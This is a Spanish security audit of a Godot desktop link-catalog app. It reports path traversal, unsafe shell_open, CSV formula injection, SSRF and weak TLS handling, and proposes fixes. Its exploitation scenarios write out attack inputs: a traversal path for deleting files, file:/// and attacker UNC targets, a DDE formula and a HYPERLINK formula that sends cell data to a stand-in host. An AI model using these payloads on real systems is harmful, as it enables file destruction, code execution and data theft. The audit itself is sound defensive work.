# Auditoría de seguridad — GestorAO

- **Objetivo:** análisis de seguridad de todo el repositorio (código propio + addons empaquetados + CI).
- **Commit auditado:** `f620b86` (`chore(release): 0.4.0`).
- **Versión:** `application/config/version = 0.4.0` (`project.godot`).
- **Método:** lectura directa, fichero a fichero, de `scripts/` (54 ficheros), `tests/`, `addons/`,
  `project.godot`, `export_presets.cfg` y `.github/workflows/`. Barridos dirigidos sobre las APIs
  peligrosas (ejecución de procesos, carga dinámica de scripts/recursos, E/S de ficheros, red,
  deserialización) y verificación manual de cada candidato contra el código real.
- **Naturaleza de la app:** aplicación **de escritorio** (single-user). **No hay multijugador, ni
  autoridad de cliente, ni anticheat, ni memoria compartida.** Las categorías "cheat / memory
  modification / client authority" del encargo son **N/A** y se documentan abajo como tales.
- **Datos sensibles:** el único dato "crítico" es el catálogo del propio usuario
  (`user://*.json` / `user://gestorao.db`) más las capturas en `user://Assets/`.

## Limitaciones

- No se descargaron binarios nativos de terceros ni se comprobó su firma/hash contra el upstream
  (auditoría de código, no de artefactos).
- No se hizo análisis de cadenas de los `.dll`/`.so` de `godot-sqlite` ni del binario exportado.
- Las severidades asumen el uso normal (usuario importa catálogos de terceros, que es una función
  de primer nivel de la app: `Importar catálogo`).

---

## 1. Resumen ejecutivo

El código propio está **bien estructurado** (vistas/controladores/stores), usa **SQL parametrizado**,
**no** ejecuta procesos del sistema, **no** carga scripts ni recursos desde cadenas dinámicas y **no**
contiene secretos. La superficie real de riesgo está concentrada en **la importación de catálogos de
terceros**: el importador confía en dos campos (`img` y `url`) y son justo los dos que después se usan
para tocar el disco y para abrir cosas con el sistema operativo.

| # | Severidad | Hallazgo | Fichero principal |
|---|-----------|----------|-------------------|
| **H1** | 🔴 Alta | *Path traversal* en el borrado de capturas vía campo `img` importado → borrado arbitrario de ficheros | `scripts/gestor_imagenes.gd`, `scripts/catalogo_controller.gd`, `scripts/gestor_archivo.gd` |
| **H2** | 🔴 Alta | `OS.shell_open()` sobre una `url` importada sin validar → apertura/ejecución de fichero o de protocolo arbitrario | `scripts/list_item.gd`, `scripts/gestor_archivo.gd` |
| **M1** | 🟠 Media | *CSV/HTML formula injection* en las exportaciones (informe, cambios, dashboard) | `scripts/informe_store.gd`, `scripts/cambios_store.gd`, `scripts/dashboard_store.gd` |
| **M2** | 🟠 Media | SSRF / acceso a red interna: el comprobador sigue `url` y redirecciones a loopback/privadas sin filtro | `scripts/link_checker.gd` |
| **M3** | 🟠 Media | `aceptar_certificados` desactiva la validación TLS de forma **global y persistente** | `scripts/link_checker.gd`, `scripts/config_store.gd` |
| **B1** | 🟡 Baja | `--almacen=` / `GESTORAO_BASE` aceptan rutas absolutas arbitrarias; la limpieza de huérfanas borra imágenes ahí | `scripts/almacen_config.gd`, `scripts/gestor_imagenes.gd` |
| **B2** | 🟡 Baja | `rutas.resolver` devuelve rutas absolutas existentes sin validar → decodificación de ficheros arbitrarios / oráculo de existencia | `scripts/rutas.gd` |
| **B3** | 🟡 Baja | El addon de desarrollo `godot_ai` (con autoload y un canal de *eval* por debugger) se **empaqueta** en el binario exportado | `project.godot`, `export_presets.cfg` |
| **B4** | 🟡 Baja | CI: acciones fijadas por *tag* flotante y `ci.yml` sin `permissions:` | `.github/workflows/*.yml` |
| **B5** | 🟡 Baja | Clave privada de prueba versionada (`-----BEGIN PRIVATE KEY-----`) | `tests/fixtures/clave_prueba.pem` |

> **Lo que está bien y se verificó explícitamente** (para evitar falsos negativos):
> sin `OS.execute`/`OS.create_process`; sin `load()`/`ResourceLoader.load()` con rutas dinámicas;
> SQL sólo con `query_with_named_bindings` y nombres de tabla desde constantes internas (sin SQLi);
> `logger` no registra credenciales; `almacen_bd` respalda antes de escribir y bloquea esquemas
> futuros; `informe_store._escape_html` cubre `& < > "` (no hay atributos entrecomillados con `'`).

---

## 2. Hallazgos detallados

### H1 — 🔴 Alta · Path traversal en el borrado de capturas (borrado arbitrario de ficheros)

**Ficheros / líneas**

- `scripts/gestor_archivo.gd:4,56-58` — el importador copia `img` **tal cual** desde el JSON.
- `scripts/gestor_archivo.gd:29,46` — la única validación es que `url` no esté vacía; `img` no se
  valida en absoluto.
- `scripts/catalogo_controller.gd:169-187` (`eliminar` devuelve el `img` de la entrada) y
  `:196-208` (`es_captura_propia` + `borrar_captura_si_huerfana`).
- `scripts/rutas.gd:39-55` (`en_base` / `relativa`): `en_base` sólo comprueba **prefijo de cadena**,
  no canonicaliza ni rechaza `..`.
- `scripts/gestor_imagenes.gd:115-121` — `borrar()` ejecuta
  `DirAccess.remove_absolute(ProjectSettings.globalize_path(ruta))`.
- Llamadas: `scripts/main.gd:842`, `scripts/edicion_controller.gd:222`.

**Explicación técnica**
`borrar_captura_si_huerfana` sólo exige `RutasScript.en_base(ruta, assets_base)`, es decir que la
cadena **empiece** por `user://Assets` (o `res://Assets`). `globalize_path()` no canonicaliza el
resultado y `DirAccess.remove_absolute()` deja que el **SO** resuelva `..`. Un `img` como

```
user://Assets/png/../../../../../../Users/victim/Escritorio/importante.txt
```

pasa `en_base`, y al borrar la entrada el SO resuelve los `..` y elimina el fichero destino.

**Escenario de explotación**
1. El atacante comparte un `catalogo.json` (función "Importar catálogo", `dashboard_ui`/`main.gd`) con
   `{"nombre":"Parche","url":"https://evil.example/x","img":"user://Assets/png/../../../../../../Users/victim/Documents/nominas.xlsx"}`.
2. La víctima lo importa. La entrada aparece normal (la miniatura falla y se usa el *placeholder*).
3. La víctima borra la entrada (o le cambia la imagen, que dispara la misma ruta de borrado).
4. El fichero objetivo se elimina. Si `img` apuntase dentro de la propia carpeta de datos, se pueden
   destruir `estados.json`, `enlaces.json` o la propia `gestorao.db`.

En Linux `user://` cae en `~/.local/share/godot/app_userdata/GestorAO`, alcanzable con `../../../..`;
en Windows `%APPDATA%\Godot\app_userdata\GestorAO`. El borrado requiere que el fichero exista, pero es
un borrado de ficheros *de la víctima sin confirmación ni aviso*.

**Código corregido (defensa en profundidad, dos capas)**

En el importador (`gestor_archivo.gd`), sanear `img` para que sea una ruta **relativa** y simple:

```gdscript
const _RE_IMG_OK := "^[A-Za-z0-9._-]+$"   # sólo nombre de fichero, sin separadores ni ".."

static func _img_segura(valor: Variant) -> String:
	var s := str(valor).strip_edges()
	if s.is_empty():
		return ""
	# Acepta sólo "png/<fichero>" o "jpg/<fichero>" con nombre simple.
	var partes := s.replace("\\", "/").split("/", false)
	if partes.size() != 2 or not ["png", "jpg"].has(partes[0]):
		return ""
	var re := RegEx.new()
	re.compile(_RE_IMG_OK)
	if re.search(partes[1]) == null or partes[1].contains(".."):
		return ""
	return "%s/%s" % [partes[0], partes[1]]
```

Y, sobre todo, que **el borrado no confíe en la cadena**: reconstruye la ruta desde el nombre del
fichero (`gestor_imagenes.gd`):

```gdscript
static func borrar(ruta: String) -> Dictionary:
	var nombre := ruta.get_file()
	if nombre.is_empty() or ARCHIVOS_FIJOS.has(nombre):
		return {"ok": false, "error": "Ruta vacía."}
	var sub := "png" if ruta.get_extension().to_lower() == "png" else "jpg"
	var segura := "%s/%s/%s" % [RutasScript.ASSETS_USER, sub, nombre]
	var err := DirAccess.remove_absolute(ProjectSettings.globalize_path(segura))
	...
```

y en `rutas.gd` añadir una comprobación de contención real:

```gdscript
static func en_base(ruta: String, base: String) -> bool:
	if not ruta.begins_with(base):
		return false
	var partes := ruta.replace("\\", "/").split("/", false)
	return not (".." in partes) and not ruta.contains("//")
```

**Recomendación**
Tratar todo catálogo importado como **no confiable**. Nunca derivar rutas de fichero de un campo de
texto importado; reconstruirlas desde el nombre. Añadir test de regresión
(`test_importar_no_borra_fuera`).

---

### H2 — 🔴 Alta · `OS.shell_open()` sobre `url` importada (apertura/ejecución de fichero o protocolo)

**Ficheros / líneas**

- `scripts/list_item.gd:370-373` — al pulsar una fila: `OS.shell_open(url)`.
- `scripts/gestor_archivo.gd:46,56-58` — el import no valida el esquema.
- `scripts/gestor_catalogo.gd:16-23` (`normalizar_url`): si no hay `://` **devuelve la cadena tal cual**;
  si el esquema no es `http`/`https`, **también la devuelve tal cual**.

**Explicación técnica**
La UI de alta de enlace (`agregar_enlace.gd`) sólo acepta `http(s)`, pero el **importador** no. Con
`url = "C:\\Users\\Public\\payload.exe"` (o `file:///C:/...`, `search-ms:`, `ms-msdt:`, una UNC
`\\\\atacante\\recurso\\x.lnk`), `normalizar_url` la deja igual y `gestor_archivo.importar` la acepta
porque sólo comprueba que no esté vacía. Después basta **un clic** en la fila para que el SO abra/ejecute
ese destino con el manejador asociado.

**Escenario de explotación**
1. El atacante crea un catálogo con `{"nombre":"Servidor oficial","url":"file:///C:/Users/victim/Descargas/setup.exe"}`.
2. La víctima importa y pulsa "Abrir" (o hace clic en la fila) esperando ir a una web.
3. `OS.shell_open` delega en ShellExecute/open: el fichero se abre o se lanza. Con un `.exe`/`.bat`/`.lnk`
   (propio o apuntando a un recurso SMB del atacante) es **ejecución de código en el equipo de la víctima**.

**Código corregido**
Validar el esquema tanto al importar como antes de abrir:

```gdscript
# gestor_archivo.gd —descarta lo que no sea http(s)
static func _url_segura(valor: Variant) -> String:
	var u := GestorCatalogoScript.normalizar_url(str(valor))
	if not (u.begins_with("http://") or u.begins_with("https://")):
		return ""
	return u

# list_item.gd —no abrir nunca algo que no sea http(s)
func _pressed() -> void:
	if url.is_empty() or not _abrir_al_presionar:
		return
	if not (url.begins_with("http://") or url.begins_with("https://")):
		return
	OS.shell_open(url)
```

**Recomendación**
Regla general del proyecto: **`OS.shell_open` sólo con `http(s)`** validado en el punto de uso, no se
confía en que la lista esté limpia. Idear un test que importe `file:///` y `C:\...` y compruebe que se
descartan o no se abren.

---

### M1 — 🟠 Media · CSV / HTML formula injection en las exportaciones

**Ficheros / líneas**

- `scripts/informe_store.gd:66-79` (`exportar_csv`), `:123-127` (`_escape_csv`).
- `scripts/cambios_store.gd:144-166` (`exportar_csv`), `:169-170` (`_escapar`).
- `scripts/dashboard_store.gd:230-270` (`exportar_csv`), `:343-344` (`_escape_csv` = sólo `replace(";", ",")`).

**Explicación técnica**
Los exportadores vuelcan `nombre`, `url`, `desc`, etc. procedentes del catálogo importado. Ninguno
neutraliza valores que empiezan por `=`, `+`, `-`, `@`, tabulador o `\r`. Al abrir el CSV en
Excel/LibreOffice, ese contenido se interpreta como **fórmula**. Además, el escape es **distinto en cada
store** (duplicación): `informe_store` entrecomilla sólo ante `;`/`"`/salto, `cambios_store` siempre
entrecomilla, y `dashboard_store` sólo cambia `;` por `,` (rompe además la estructura del CSV con
comas/comillas/saltos).

**Escenario de explotación**
Entrada importada `nombre = "=cmd|'/c calc'!A0"` o `=HYPERLINK("https://evil.example/?d="&A1,"Ver")`.
La víctima exporta el informe y lo abre en Excel/LibreOffice: se ejecuta la fórmula (DDE → ejecución de
comandos; `HYPERLINK`/`WEBSERVICE` → exfiltración de celdas).

**Código corregido (helper único y compartido)**

```gdscript
static func _celda(valor: String) -> String:
	var s := valor.replace("\r", " ").replace("\n", " ")
	if not s.is_empty() and ("=+-@\t".contains(s[0])):
		s = "'" + s          # marca como texto para el motor de hoja de cálculo
	return '"%s"' % s.replace('"', '""')
```

**Recomendación**
Unificar los tres `_escape_csv` en **una** función compartida (p. ej. `scripts/csv.gd`) y usarla en los
tres sitios. Esto además elimina la duplicación detectada. Añadir caso de test con `=cmd|...`.

---

### M2 — 🟠 Media · SSRF / peticiones a red interna desde el comprobador

**Ficheros / líneas**

- `scripts/link_checker.gd` — `_parsear_url` (host/puerto libres, sin filtro), `_enviar_pedido`,
  `_resolver_redirect` (sigue `Location` a cualquier host), `:217-229` (TLS).
- `scripts/cola_escaneo.gd`, `scripts/scan_controller.gd` — orquestan el escaneo de todas las entradas.

**Explicación técnica**
El comprobador abre conexiones a **cualquier** `host:puerto` que venga en una `url` (incluido
`http://127.0.0.1:PORT/`, `http://169.254.169.254/…` de metadatos de nube, `http://192.168.x.x/`,
`http://[::1]/`), y además sigue redirecciones `Location` hacia esos destinos. Un catálogo importado
puede "armar" la app para que, al pulsar **Comprobar todo**, emita peticiones a servicios internos y
**exponga su disponibilidad** en la UI/estado/logs (sondeo de puertos y CSRF hacia paneles locales).

**Escenario de explotación**
Catálogo con 200 entradas `http://192.168.1.1/admin`, `http://127.0.0.1:8080/`, `http://169.254.169.254/latest/meta-data/`.
La víctima importa y comprueba todo: la app hace las peticiones desde su red, y el resultado
("Válido/Caído", códigos HTTP) queda en pantalla y en `logs/scan.log`, útil para mapear la red interna.

**Recomendación**
Bloquear por defecto loopback, link-local y rangos privados (RFC1918), y no seguir redirecciones a un
host fuera del dominio original. Si se quiere permitir el auto-chequeo, que sea un opt-in explícito.
También conviene no reenviar `Authorization`/cookies en redirecciones cross-host (no las usa hoy, pero
conviene dejarlo escrito).

---

### M3 — 🟠 Media · `aceptar_certificados` desactiva la validación TLS de forma global y persistente

**Ficheros / líneas**

- `scripts/link_checker.gd:151-152` (reintento) y `:217-229` (`TLSOptions.client_unsafe(null)`).
- `scripts/config_store.gd` (persiste `aceptar_certificados`).

**Explicación técnica**
La preferencia se guarda y se aplica a **todas** las comprobaciones mientras esté activa. Al aceptar
un certificado no válido se cae en `client_unsafe(null)`, que **deshabilita la verificación completa**
de la cadena. La app avisa en la UI, pero una vez activado no hay pin ni confirmación por host.

**Escenario de explotación**
Un atacante en la red (WiFi pública, MITM) induce un fallo TLS; la víctima, "para que funcione",
activa la opción; a partir de ahí cualquier respuesta HTTPS puede ser falsificada: se puede marcar un
enlace como Válido/Caído a voluntad o inyectar el HTML de la página de descarga que el usuario abrirá.

**Recomendación**
Limitar `client_unsafe` a una comprobación **puntual** y al host concreto (o mejor, sólo mostrar el
certificado y dejar la decisión de abrirlo al navegador del usuario); no persistir el estado inseguro
como modo por defecto. Mínimo: aviso claro y badge visible en la UI mientras esté activo.

---

### B1 — 🟡 Baja · Rutas absolutas arbitrarias por `--almacen=` / `GESTORAO_BASE`

**Ficheros / líneas**

- `scripts/almacen_config.gd:59-66,70-71` (`--almacen=`, `ENV_ALMACEN`, `ENV_BASE`).
- `scripts/almacen.gd:34-37` (`ruta_ok` acepta rutas absolutas).
- `scripts/gestor_imagenes.gd:130-146` (`limpiar_huerfanas` borra `*.png`/`*.jpg` no referidas bajo
  `<base>/Assets/png|jpg`).

**Explicación técnica**
Si un atacante puede influir en el entorno/argumentos con los que se lanza la app (acceso directo,
lanzador corporativo, script), puede apuntar `base` a una ruta del sistema. La app escribirá allí sus
`*.json`/`gestorao.db` (posible sobreescritura) y, si existe `<base>/Assets/png|jpg`, el borrado de
huérfanas eliminará **cualquier imagen no referida** de esa carpeta. Es un vector local/de entorno, no
remoto, por eso Baja.

**Recomendación**
Advertir en la UI y registrar en el log cuando `base` venga de env/args; exigir que el directorio esté
vacío o que sea una carpeta dedicada antes de aceptarlo; no ejecutar limpieza agresiva fuera de
`user://` sin confirmación explícita.

---

### B2 — 🟡 Baja · `rutas.resolver` devuelve rutas absolutas existentes

**Ficheros / líneas**

- `scripts/rutas.gd:26-36` (`resolver` devuelve `ruta` si existe), `:39-55` (`relativa`).
- `scripts/cache_texturas.gd` (`_firma`/carga), `scripts/list_item.gd` (miniatura),
  `scripts/agregar_enlace.gd` (previsualización) consumen el resultado.

**Explicación técnica**
Si un `img` importado es una ruta absoluta existente (p. ej. `/etc/hostname`), `resolver` la devuelve y
se pasa a `Image.load_from_file`. El fallo de decodificación cae al *placeholder*, pero la app lee el
tamaño/`sha256` del fichero en algunos caminos (`gestor_imagenes._captura_con_hash`,
`cache_texturas`), lo que actúa como **oráculo de existencia/tamaño** de ficheros. Impacto muy bajo, pero
es la misma raíz que H1: no validar `img`.

**Recomendación**
En `resolver`, aceptar sólo rutas bajo `user://Assets`/`res://Assets` y con nombre simple. Comparte el
saneo de H1.

---

### B3 — 🟡 Baja · El addon `godot_ai` (herramienta de desarrollo) viaja en el binario exportado

**Ficheros / líneas**

- `project.godot:21` — autoload `_mcp_game_helper = addons/godot_ai/runtime/game_helper.gd`.
- `project.godot:35` — `addons/godot_ai/plugin.cfg` en `[editor_plugins]`.
- `export_presets.cfg:13-15` — `export_filter="all_resources"`, **sin** `exclude_filter` → se empaqueta
  **todo** `addons/`, incluido `godot_ai` (servidor MCP, herramientas, `.godot_ai_update`) y las
  librerías `*template_debug*` de `godot-sqlite`.
- `addons/godot_ai/runtime/game_helper.gd` — autoload que registra una captura de mensajes del
  *debugger* (`mcp:eval`) capaz de evaluar GDScript dentro del proceso del juego.
- `addons/godot_ai/utils/windows_port_reservation.gd:67` — `OS.execute("netsh", …)` (sólo en el editor).

**Explicación técnica**
El autoload entra en el `.pck` y se ejecuta también en el binario exportado. En *templates* de release
el *debugger* remoto está deshabilitado (`DEBUG_ENABLED=false`), por lo que `mcp:eval` **no es
alcanzable** en el binario de release tal cual. El riesgo es: (a) superficie y peso innecesarios en el
producto final; (b) si algún día se distribuye un binario con *debug* habilitado, queda un
**canal de ejecución remota de código** apoyado en el protocolo de debug de Godot. El addon MCP en sí
está razonablemente contenido: por defecto **escucha sólo en loopback** (`ws://127.0.0.1`, allowlist de
hosts vacía = sólo loopback, con guarda anti DNS-rebinding) y su actualizador **verifica firmas**
(`utils/release_verifier.gd`, `RELEASE_SIGNING_PUBLIC_KEY_PEM`). El problema es **empaquetarlo**, no el
addon en el editor.

**Recomendación**
Excluir del export las herramientas de desarrollo y las libs de debug:

```
exclude_filter="addons/godot_ai/*,addons/godot-sqlite/bin/*template_debug*,.godot_ai_update/*"
```

Y quitar el autoload `_mcp_game_helper` de `project.godot` (el plugin lo re-registra al habilitarse en el
editor). Verificar después con `tests/run_smoke.sh` y con `SmokeScript.ESCENAS`.

---

### B4 — 🟡 Baja · Cadena de suministro en CI: acciones sin fijar y permisos implícitos

**Ficheros / líneas**

- `.github/workflows/ci.yml:1-3` — **no** declara `permissions:` → hereda el valor por defecto del repo.
- `.github/workflows/ci.yml` / `release.yml` / `.github/actions/godot/action.yml` — usan
  `actions/checkout@v4`, `actions/cache@v4`, `actions/upload-artifact@v4`, `actions/setup-python@v5`,
  `softprops/action-gh-release@v2` (etiquetas móviles, no SHA).
- `release.yml:13-14` — `permissions: contents: write`.

**Explicación técnica**
Las acciones referenciadas por etiqueta pueden ser re-apuntadas por un compromiso upstream y ejecutar
código con el token del repo (en `release.yml`, con permiso de escritura). Además `ci.yml` ejecuta código
de PRs (`--import`, tests, export + smoke) sin `permissions: contents: read` explícito. No hay secretos
referenciados en los workflows, lo que limita el impacto.

**Recomendación**
Fijar cada acción a **commit SHA** y añadir `permissions: contents: read` a `ci.yml` (y el mínimo
necesario en cada job). Considerar `pull_request_target` **no** es necesario aquí; mantener `pull_request`.

---

### B5 — 🟡 Baja · Clave privada de prueba versionada

**Fichero**

- `tests/fixtures/clave_prueba.pem` (`-----BEGIN PRIVATE KEY-----`) y `tests/fixtures/cert_prueba.pem`.
- Usada sólo por `tests/test_link_checker_tls.gd:5-6` (servidor TLS local de prueba).

**Explicación técnica**
Es una clave *desechable* de test, pero cualquier `git grep`/escaner de secretos la levanta y podría
reutilizarse por error. No hay impacto directo (no firma nada de producción).

**Recomendación**
Marcarla como tal (nombre y cabecera `test-only`), o generarla en el propio test si es viable; excluir
`tests/fixtures/*.pem` de los escaneos de secretos con allowlist documentada.

---

## 3. Superficie por categoría del encargo (qué se comprobó y qué se descartó)

| Categoría | Resultado |
|---|---|
| Ejecución arbitraria de código | No hay `OS.execute`/`create_process` en código propio. Riesgo indirecto en **H2** (`shell_open` de fichero/protocolo) y latente en **B3** (`mcp:eval`, sólo con debug habilitado). |
| `OS.execute` peligroso | Sólo en `addons/godot_ai` (editor). No en `scripts/`. |
| Argumentos externos inseguros | `--almacen=`/`GESTORAO_BASE`/`--smoke` (**B1**). |
| Carga dinámica de scripts/recursos | No existe `load()`/`ResourceLoader.load()` con cadenas de datos; sólo rutas `res://` fijas. |
| E/S de ficheros insegura | **H1** y **B2** (rutas derivadas de datos). |
| Directory traversal | **H1** (borrado) y, en menor grado, escritura de capturas en `almacen_json.guardar_captura(nombre, …)` —sólo alcanzable desde volcado/migración propia—. |
| Lectura/escritura fuera de `user://` | Sólo con `base` externa (**B1**). |
| Deserialización insegura | `JSON.parse_string` (Godot) no ejecuta código; sin *prototype pollution*. Bajo/unbounded size únicamente. |
| Riesgos de `JSON.parse()` | Idem; no hay `str_to_var`/`bytes_to_var` sobre datos externos (correcto: `var_to_bytes` no se usa para entrada no confiable). |
| Riesgos de `load()`/`ResourceLoader` | Ninguno dinámico. |
| Código que altera guardados/datos críticos | **H1**. Además, cualquier usuario local puede editar `user://*.json`/`.db`: **no hay firma**. No es vuln en una app personal, pero implica "no confiar en catálogos/backups importados" (raíz de H1/H2). |
| Secretos expuestos | **Ninguno** en `scripts/`, `project.godot` ni workflows. Sólo la clave de test (**B5**). |
| HTTP/HTTPS | TLS verificado por defecto; **M3** (opt-in inseguro). `actualizador.gd` no descarga ni instala, sólo lee metadatos de la release y valida `html_url`; el updater del addon verifica firmas. |
| Validación de datos de Internet | **H1/H2/M1/M2**: el import de catálogo es la superficie de entrada principal y valida poco. |
| Autoridad de cliente / multijugador | **N/A**: no hay red de juego ni autoridad de cliente. |
| Cheat / modificación de memoria | **N/A**. El "score" no existe; el estado vive en `user://` y es local por diseño. |
| Dependencias vulnerables | `godot-sqlite` 4.9 / SQLite 3.51 (binarios precompilados, sin verificación de integridad en build): mantener actualizado y verificar contra upstream. `godot_ai`: herramienta de dev con MCP local (loopback) y releases firmadas. |
| Código duplicado/problemático | `_escape_csv`/`_escapar` triplicado e **inconsistente** (**M1**); `html`/`csv` de informe y cambios con la misma lógica copiada. |

### Multijugador / cheat / memoria (N/A, justificado)
No hay `MultiplayerAPI`, `ENetMultiplayerPeer`, `RPC`, ni socket servidor en `scripts/`. No hay puntuaciones
compartidas ni estado autoritativo. La app no expone red de escucha. Por eso no aplican "autoridad del
cliente", "cheat" ni "modificación de memoria"; el único estado es local del usuario.

---

## 4. Verificaciones que salieron limpias (para no repetirlas)

- **SQL**: `scripts/almacen_bd.gd` usa `query_with_named_bindings` para todos los datos; los nombres de
  tabla interpolados (`_escribir_lista`, `_leer_meta`) provienen de la constante interna `TABLAS` y de
  una lista fija, nunca de entrada. **Sin inyección SQL.**
- **Ejecución**: no hay `OS.execute` ni `create_process` en `scripts/`; `OS.shell_open` sólo en
  `list_item.gd:373`, `preferencias.gd:109` (abre la carpeta de datos elegida) y `update_controller.gd:63`
  (**H2** cubre el caso de `url`; el resto son destinos locales/constantes).
- **Actualizador**: `scripts/actualizador.gd` consulta metadatos de GitHub por HTTPS, con timeout y sin
  descargar ni ejecutar artefactos; el `html_url` sólo se abre con `shell_open` (dominio de confianza sobre TLS).
- **Redirecciones**: `scripts/redirecciones.gd` limita a ~6 saltos y compara host/path (ver **M2** para
  el seguimiento a hosts internos).
- **Logs**: `scripts/logger.gd` no registra credenciales ni cabeceras.
- **HTML**: `informe_store._escape_html` neutraliza `& < > "`; no hay atributos entrecomillados con `'`.
- **JSON**: sin `str_to_var`/`bytes_to_var` sobre datos externos.

---

## 5. Plan de remediación priorizado

1. **H1** y **H2** (Alta): sanear `img` y `url` en la importación y en el punto de uso. Un único módulo
   de validación (`scripts/catalogo_validador.gd`) con tests unitarios. *Bloquea el uso seguro de
   "Importar catálogo".*
2. **M1** (Media): unificar el escapado CSV y neutralizar fórmulas (`= + - @`). *Fácil, alto retorno.*
3. **M2** y **M3** (Media): filtro de rangos privados/loopback en el comprobador y reducir el alcance de
   `aceptar_certificados`.
4. **B3** (Baja): excluir `addons/godot_ai`, `*template_debug*` y `.godot_ai_update` del export y retirar
   el autoload; validar con smoke test.
5. **B4** (Baja): fijar acciones por SHA y añadir `permissions: contents: read` a `ci.yml`.
6. **B1**, **B2**, **B5** (Baja): avisos/logs en `base` externa, restringir `resolver` a las carpetas de
   assets, y tratar la clave de test como artefacto de test.

---

## 6. Anexo — cómo se reprodujo

- Importación real: `dashboard_ui`/`main.gd` → `import_export_controller.importar` →
  `gestor_archivo.importar` → `catalogo_controller`/`gestor_imagenes`.
- Borrado real: `main.gd:842` y `edicion_controller.gd:222` → `catalogo_controller.borrar_captura_si_huerfana`
  → `rutas.en_base` → `gestor_imagenes.borrar` → `DirAccess.remove_absolute`.
- Apertura real: `list_item.gd:370-373` → `OS.shell_open(url)`.
- Exportaciones: `informe_store.exportar_csv/html`, `cambios_store.exportar_csv`,
  `dashboard_store.exportar_csv`.

> Este documento es un entregable de auditoría. No modifica el código de la aplicación: cada
> corrección propuesta debe aplicarse en su fichero correspondiente y acompañarse de su test.
